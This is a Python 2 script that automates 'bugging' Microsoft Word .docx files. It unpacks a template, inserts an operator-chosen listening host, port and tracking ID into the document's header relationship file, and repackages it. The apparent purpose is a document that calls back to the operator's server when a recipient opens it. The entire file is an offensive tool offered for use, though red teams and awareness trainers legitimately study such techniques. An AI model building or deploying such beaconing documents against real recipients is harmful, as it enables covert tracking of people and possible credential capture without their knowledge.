#!/usr/bin/python
### Automated script for bugging docx files
### Written by: dru1d (dru1d@foofus.net;dru1d@dru1d.ninja)
### Credit and inspiration: https://www.blackhillsinfosec.com/bugging-docx-files-using-microsoft-word-part-1/
### tons of credit to the various stackoverflow posts that I stole code snippets from

import argparse
import os
import time
import uuid
import zipfile

# create new docx; zip function
def zipdir(path, ziph):
	length = len(path)
	for root, dirs, files in os.walk('./tmp-extract/'):
		folder = root[length:]
		for file in files:
			ziph.write(os.path.join(root,file), os.path.join(folder, file))

def main():
	# Argument logic
	parser = argparse.ArgumentParser()
	parser.add_argument('--outputfile', help='set the name of the outputfile')
	parser.add_argument('--input', help='choose what file you want to use as a template; default black Doc1.docx')
	parser.add_argument('--cleanup', help='cleans the tmp-extract directory', action='store_true')
	requiredNamedArguments = parser.add_argument_group('required arguments')
	requiredNamedArguments.add_argument('--lhost', help='set listening server address', required=True)
	requiredNamedArguments.add_argument('--lport', help='set the listening server port', required=True)
	args = parser.parse_args()

	# Generate pseudo-random ID
	rid = (uuid.uuid4()).hex
	defaultOutputfile = 'Doc1-' + rid + '.docx'

	# check if necessary folders exist; if not create them

	if not os.path.exists('./output/'):
		print 'Creating default output directory!!!'
		os.makedirs('./output/')
	if not os.path.exists('./tmp-extract/'):
		print 'Creating tmp-extract directory!!!'
		os.makedirs('./tmp-extract/')

	# Print settings
	print 'Host: ' + args.lhost
	print 'Port: ' + args.lport
	print 'RID: ' + rid
	if args.outputfile:
		print 'Outputfile: ' + args.outputfile
		outfilename = args.outputfile
	else: 
		print 'Outputfile: ' + defaultOutputfile
		outfilename = defaultOutputfile
	# unzip .docx file
	if args.input:
		zip_ref = zipfile.ZipFile(args.input)
	else:
		zip_ref = zipfile.ZipFile('./template/Doc1.docx', 'r')
	zip_ref.extractall('./tmp-extract/')
	zip_ref.close()
	# Replace strings with variables in header1.xml.rels
	f = open('./tmp-extract/word/_rels/header1.xml.rels', 'rw').read().replace('$LHOST',args.lhost).replace('$LPORT', args.lport).replace('$RID', rid)
	f1 = open('./tmp-extract/word/_rels/header1.xml.rels', 'w')
	f1.write(f)
	f1.close()
	print 'Waiting for file operations to finish...'
	time.sleep(5)
	zipf = zipfile.ZipFile('./output/' + outfilename, 'w', zipfile.ZIP_DEFLATED)
	zipdir('./tmp-extract/', zipf)
	zipf.close()

	#cleanup ./tmp-extract/
	if args.cleanup:
		os.popen('rm -rf ./tmp-extract/*')
		print './tmp-extract/ has been cleaned up'

if __name__ == '__main__':
    main()
